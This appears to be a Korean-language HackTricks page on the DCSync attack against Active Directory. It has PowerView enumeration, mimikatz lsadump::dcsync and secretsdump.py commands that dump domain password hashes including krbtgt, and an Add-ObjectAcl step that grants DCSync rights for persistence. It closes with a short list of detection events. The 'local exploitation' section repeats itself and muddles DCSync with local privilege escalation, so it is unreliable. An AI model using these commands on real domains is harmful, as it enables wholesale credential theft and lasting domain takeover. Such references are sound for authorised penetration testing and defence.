# DCSync

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)를 사용하여 세계에서 가장 **고급 커뮤니티 도구**를 활용한 **워크플로우를 쉽게 구축하고 자동화**하세요.\
오늘 액세스하세요:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 제로에서 영웅까지 AWS 해킹 배우기<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* 독점적인 [**NFT**](https://opensea.io/collection/the-peass-family) 컬렉션인 [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**를** **팔로우**하세요.
* **HackTricks**](https://github.com/carlospolop/hacktricks)와 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하여 자신의 해킹 기법을 공유하세요.

</details>

## DCSync

**DCSync** 권한은 도메인 자체에 대해 다음 권한을 가지는 것을 의미합니다: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** 및 **Replicating Directory Changes In Filtered Set**.

**DCSync에 대한 중요한 사항:**

* **DCSync 공격은 도메인 컨트롤러의 동작을 모방하고 다른 도메인 컨트롤러에게 디렉터리 복제 서비스 원격 프로토콜 (MS-DRSR)을 사용하여 정보를 복제하도록 요청**합니다. MS-DRSR은 Active Directory의 유효하고 필요한 기능이므로 끌거나 비활성화할 수 없습니다.
* 기본적으로 **Domain Admins, Enterprise Admins, Administrators 및 Domain Controllers** 그룹만 필요한 권한을 가지고 있습니다.
* 암호가 역방향 암호화로 저장된 경우 Mimikatz에는 암호를 평문으로 반환하는 옵션이 있습니다.

### 열거

`powerview`를 사용하여 이러한 권한을 가진 사용자를 확인하세요:
```powershell
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```
### 로컬에서 악용하기

DCSync는 도메인 컨트롤러(Domain Controller)에서 도메인 계정의 NTLM 해시를 복제하는 기능을 이용합니다. 이 기능을 악용하여 로컬에서 권한 상승을 수행할 수 있습니다.

#### DCSync 사용하기

DCSync를 사용하기 위해서는 다음과 같은 조건이 필요합니다:

- 도메인 관리자 권한을 가진 사용자 계정
- 도메인 컨트롤러에 대한 액세스 권한

DCSync를 사용하여 NTLM 해시를 복제하려면 다음 단계를 따르세요:

1. 로컬에서 도메인 관리자 권한을 가진 계정으로 로그인합니다.
2. 명령 프롬프트 또는 PowerShell을 엽니다.
3. 다음 명령을 실행하여 DCSync를 사용합니다:

```plaintext
mimikatz privilege::debug
mimikatz lsadump::dcsync /user:<계정명>
```

위 명령을 실행하면 해당 계정의 NTLM 해시가 복제됩니다.

#### 권한 상승을 위한 DCSync 사용하기

DCSync를 사용하여 권한 상승을 수행하려면 다음 단계를 따르세요:

1. 로컬에서 도메인 관리자 권한을 가진 계정으로 로그인합니다.
2. 명령 프롬프트 또는 PowerShell을 엽니다.
3. 다음 명령을 실행하여 DCSync를 사용합니다:

```plaintext
mimikatz privilege::debug
mimikatz lsadump::dcsync /user:<계정명>
```

위 명령을 실행하면 해당 계정의 NTLM 해시가 복제됩니다.
4. 복제한 NTLM 해시를 사용하여 권한 상승을 수행합니다.

#### 주의사항

- DCSync를 사용하여 NTLM 해시를 복제하려면 도메인 관리자 권한이 필요합니다.
- DCSync를 사용하여 권한 상승을 수행하려면 해당 계정의 NTLM 해시를 복제한 후 권한 상승 기술을 사용해야 합니다.
```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```
### 원격으로 악용하기

The DCSync attack can be exploited remotely if the attacker has administrative privileges on a compromised machine within the domain. By using tools like `mimikatz`, the attacker can impersonate a domain controller and request the replication of the NTLM hashes from the targeted domain controller. This allows the attacker to retrieve the password hashes of all domain user accounts, including those of privileged users such as administrators.

To exploit the DCSync vulnerability remotely, follow these steps:

1. Gain administrative privileges on a compromised machine within the target domain.
2. Download and execute `mimikatz` on the compromised machine.
3. Use the `lsadump::dcsync` module in `mimikatz` to request the replication of NTLM hashes from the targeted domain controller.
4. Retrieve the dumped hashes, which can be used for further attacks such as password cracking or pass-the-hash attacks.

It is important to note that exploiting the DCSync vulnerability remotely requires administrative privileges on a compromised machine within the domain. Without these privileges, the attack cannot be executed remotely.
```powershell
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
[-just-dc-user <USERNAME>] #To get only of that user
[-pwd-last-set] #To see when each account's password was last changed
[-history] #To dump password history, may be helpful for offline password cracking
```
`-just-dc`는 3개의 파일을 생성합니다:

* **NTLM 해시**가 있는 파일 하나
* **Kerberos 키**가 있는 파일 하나
* **가능한 경우** [**가역 암호화**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption)가 활성화된 NTDS의 평문 암호가 있는 파일 하나. 가역 암호화가 활성화된 사용자는 다음과 같이 가져올 수 있습니다.

```powershell
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```

### 지속성

도메인 관리자인 경우, `powerview`를 사용하여 이 권한을 다른 사용자에게 부여할 수 있습니다.
```powershell
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```
그런 다음, **사용자가 올바르게 할당되었는지 확인**하기 위해 다음 명령의 출력에서 해당 권한의 이름을 찾아볼 수 있습니다 (권한의 이름은 "ObjectType" 필드 내에 표시됩니다):
```powershell
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
```
### 완화 방법

* 보안 이벤트 ID 4662 (객체에 대한 감사 정책이 활성화되어야 함) - 객체에 대한 작업이 수행되었습니다.
* 보안 이벤트 ID 5136 (객체에 대한 감사 정책이 활성화되어야 함) - 디렉터리 서비스 객체가 수정되었습니다.
* 보안 이벤트 ID 4670 (객체에 대한 감사 정책이 활성화되어야 함) - 객체의 권한이 변경되었습니다.
* AD ACL 스캐너 - ACL의 생성 및 비교 보고서를 생성합니다. [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)

## 참고 자료

* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
* [https://yojimbosecurity.ninja/dcsync/](https://yojimbosecurity.ninja/dcsync/)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFT**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)를 **팔로우**하세요.
* **HackTricks**와 **HackTricks Cloud** github 저장소에 PR을 제출하여 **해킹 트릭을 공유**하세요.

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)를 사용하여 세계에서 가장 고급스러운 커뮤니티 도구를 활용한 **워크플로우를 쉽게 구축하고 자동화**하세요.\
오늘 바로 액세스하세요:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
